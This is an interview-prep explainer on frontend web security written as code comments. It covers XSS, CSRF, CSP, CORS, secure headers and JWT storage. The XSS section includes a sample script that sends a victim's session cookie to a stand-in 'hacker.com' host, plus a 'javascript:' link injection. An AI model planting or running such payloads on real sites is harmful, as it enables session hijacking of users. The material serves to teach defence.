// Frontend security isn't just about "using HTTPS." It's about protecting the user's browser from executing malicious code or making unauthorized requests. Think of your app as a house: **XSS** is a stranger sneaking in through the window, while **CSRF** is someone tricking you into opening the front door yourself.

// ---

// ## 1. XSS (Cross-Site Scripting)

// Malicious scripts are injected into your site and executed in the victim's browser.

// * **The Deep Dive:** There are three types: **Stored** (script is in the DB), **Reflected** (script is in a URL parameter), and **DOM-based** (vulnerability is in the client-side JS logic).
// * **Simple Example:** A comment section where a user submits `<script>fetch('https://hacker.com?cookie=' + document.cookie)</script>`. If you render this as HTML, every user who reads the comment sends their session cookie to the hacker.
// * **Prevention:** **Sanitization** (stripping dangerous tags) and **Escaping** (turning `<` into `&lt;`).

// ### 🚩 Tricky Interview Question:

// > **"React escapes strings automatically. Does that mean a React app is 100% immune to XSS?"**
// > * **The Answer:** No. There are three main "trapdoors":
// > 1. `dangerouslySetInnerHTML`: As the name implies, it bypasses escaping.
// > 2. **Attribute Injection:** `<a href={userWebsite}>`. If `userWebsite` is `javascript:alert('XSS')`, it executes when clicked.
// > 3. **Server-Side Rendering:** If you bootstrap initial data into a `<script>` tag on the window, a clever payload can break out of the JSON string.
// > 
// > 
// > 
// > 

// ---

// ## 2. CSRF (Cross-Site Request Forgery)

// A malicious site tricks a logged-in user's browser into sending a request to your server.

// * **Simple Example:** You are logged into `bank.com`. You visit `evil.com`. Behind the scenes, `evil.com` triggers a form submit to `bank.com/transfer?to=hacker`. Because your browser automatically attaches your `bank.com` cookies, the bank thinks *you* made the request.
// * **Prevention:** **CSRF Tokens** (a secret, unique value that must be sent in the request header/body) or **SameSite Cookies** (`Lax` or `Strict`).

// ### 🚩 Tricky Interview Question:

// > **"If my API is strictly JSON-based and only accepts `Content-Type: application/json`, am I safe from CSRF?"**
// > * **The Trap:** Many think `<form>` tags can't send JSON, so they're safe.
// > * **The Reality:** No. While standard HTML forms can't send JSON, a hacker can use `navigator.sendBeacon` or a simple text/plain fetch with a JSON-like string as the body to bypass "simple request" preflights. Always use tokens or SameSite headers.
// > 
// > 

// ---

// ## 3. CSP (Content Security Policy)

// A security header that tells the browser which sources of content (scripts, styles, images) are trusted.

// * **Simple Example:** `Content-Security-Policy: script-src 'self' https://apis.google.com`. This tells the browser: "Only run scripts from my own domain or Google's API. Block everything else (including inline scripts)."

// ---

// ## 4. CORS (Cross-Origin Resource Sharing)

// CORS is **not** a security feature to protect the server; it's a browser-enforced mechanism to protect the *user* from unauthorized cross-origin data access.

// * **Simple Example:** `site-a.com` tries to fetch data from `api-b.com`. The browser sends a "Preflight" (`OPTIONS` request). If `api-b.com` doesn't return the header `Access-Control-Allow-Origin: site-a.com`, the browser blocks the response.

// ### 🚩 Tricky Interview Question:

// > **"Does a 'CORS error' mean the request didn't reach the server?"**
// > * **The Answer:** Not necessarily. For "Simple Requests" (like a standard GET), the server **does** receive the request and processes it. The browser just refuses to let the JavaScript see the result. For "Complex Requests" (with custom headers or PUT/DELETE), the preflight `OPTIONS` call prevents the actual request from ever firing if CORS fails.
// > 
// > 

// ---

// ## 5. Secure Headers

// These are the "low-hanging fruit" that provide massive protection for little effort.

// | Header | Purpose |
// | --- | --- |
// | **Strict-Transport-Security (HSTS)** | Forces the browser to use HTTPS only. Prevents SSL stripping. |
// | **X-Content-Type-Options: nosniff** | Prevents the browser from "guessing" the file type (e.g., executing a .txt file as JS). |
// | **X-Frame-Options: DENY** | Prevents **Clickjacking** (loading your site in an invisible iframe on a hacker's site). |
// | **Referrer-Policy** | Controls how much info is sent in the `Referer` header when clicking a link. |

// ---

// ### 🚩 The "Senior Architect" Interview Question:

// > **"How would you store a JWT (JSON Web Token) on the frontend: LocalStorage or HttpOnly Cookies?"**
// > * **The Pro Comparison:**
// > * **LocalStorage:** Vulnerable to **XSS**. If a script runs, it can read your token and steal your identity.
// > * **HttpOnly Cookies:** Immune to XSS (JS can't read them), but vulnerable to **CSRF**.
// > * **The Best Practice:** Use **HttpOnly, Secure, SameSite=Strict Cookies**. Then, add a CSRF token to your headers to handle the CSRF risk. This covers both bases.
// > 
// > 
// > 
// > 

// ---

